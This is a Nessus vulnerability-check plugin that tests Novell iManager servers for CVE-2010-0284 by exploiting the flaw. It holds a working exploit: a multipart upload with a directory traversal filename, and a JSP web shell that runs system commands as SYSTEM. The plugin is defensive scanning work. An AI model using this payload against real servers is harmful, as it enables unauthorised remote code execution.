#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(47581);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2015/09/24 21:17:13 $");

  script_cve_id("CVE-2010-0284");
  script_bugtraq_id(40931, 43635);
  script_osvdb_id(65629, 68320);
  script_xref(name:"Secunia", value:"40198");
  script_xref(name:"Secunia", value:"41687");

  script_name(english:"Novell 'modulemanager' Servlet Arbitrary File Upload (intrusive check)");
  script_summary(english:"Tries to upload and access a JSP file");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A web application on the remote Windows host has an arbitrary file
upload vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The Administration Console component of Novell Access Manager or
Novell iManager hosted on the remote web server has an arbitrary
file upload vulnerability.  Sending a specially crafted multipart
POST request to '/nps/servlet/modulemanager' results in the upload
of arbitrary data. Specifying a destination filename that contains
a directory traversal string allows an attacker to write arbitrary
files as SYSTEM.  Only Windows installs are affected.

A remote attacker could exploit this to upload arbitrary files to the
system, resulting in remote code execution."
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.zerodayinitiative.com/advisories/ZDI-10-112/"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?fc3c7407"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.zerodayinitiative.com/advisories/ZDI-10-190/"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.novell.com/support/viewContent.do?externalId=7006515"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Upgrade to Access Manager 3.1 SP2 / iManager 2.7 ftf3 or later."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Novell iManager File Upload");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'Novell iManager getMultiPartParameters Arbitrary File Upload');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"vuln_publication_date",value:"2010/06/10");
  script_set_attribute(attribute:"patch_publication_date",value:"2010/06/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/07/01");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("os_fingerprint.nasl", "http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 8443);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


# Unless we're paranoid, bail out if OS has been determined and is not Windows
if (report_paranoia < 2)
{
  os = get_kb_item('Host/OS');
  if (os && 'Windows' >!< os)
    exit(0, 'Only Windows hosts are affected.');
}

port = get_http_port(default:8443);
url = '/nps/servlet/modulemanager';
  
# The exploit allows us to upload this JSP source which will execute as SYSTEM
cmd = 'ipconfig';
jsp_source = '<%@ page import="java.io.*" %>
<%
Process p = Runtime.getRuntime().exec("'+cmd+'");
String output= "";
String temp = null;
InputStreamReader reader = new InputStreamReader(p.getInputStream());
BufferedReader stdin = new BufferedReader(reader);

while ((temp = stdin.readLine()) != null)
{
  output += temp;
  if (temp.length() > 0) {output += "\\n";}
}
%><%= output %>';

boundary = '--nessus';
filename = SCRIPT_NAME+'-'+rand()+'.jsp';
postdata =
  boundary+'\r\n'+
  'Content-Disposition: form-data; name="filename"; '+
  'filename="../../../../../../Program Files/Novell/Tomcat/webapps/nps/'+filename+'"\r\n'+
  'Content-Type: application/x-java-archive\r\n\r\n'+
  jsp_source+'\r\n';

req = http_mk_post_req(
  item:url,
  port:port,
  content_type:'multipart/form-data; boundary='+boundary,
  data:postdata
);
res = http_send_recv_req(port:port, req:req, exit_on_fail:TRUE);

url = '/nps/'+filename;
res = http_send_recv3(
  method:"GET",
  item:url,
  port:port,
  exit_on_fail:TRUE
);

if ('Windows IP Configuration' >< res[2])
{
  if (report_verbosity > 0)
  {
    report =
      '\n' + "Nessus was able to execute the '" + cmd + "' command by first uploading" +  
      '\na file using the following request :' + 
      '\n' + 
      '\n' + crap(data:"-", length:30) + ' snip ' +  crap(data:"-", length:30) + 
      '\n' + http_mk_buffer_from_req(req:req) + 
      '\n' + crap(data:"-", length:30) + ' snip ' +  crap(data:"-", length:30) + 
      '\n' + 
      '\nand then calling it using the following URL :' + 
      '\n' + 
      '\n  ' + build_url(qs:url, port:port) + '\n';
    if (report_verbosity > 1)
    {
      report +=
        '\nThis produced the following output :\n\n'+
        crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30)+'\n'+
        res[2]+
        crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30)+'\n';
    }
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else exit(0, 'The server on port '+port+' is not affected.');
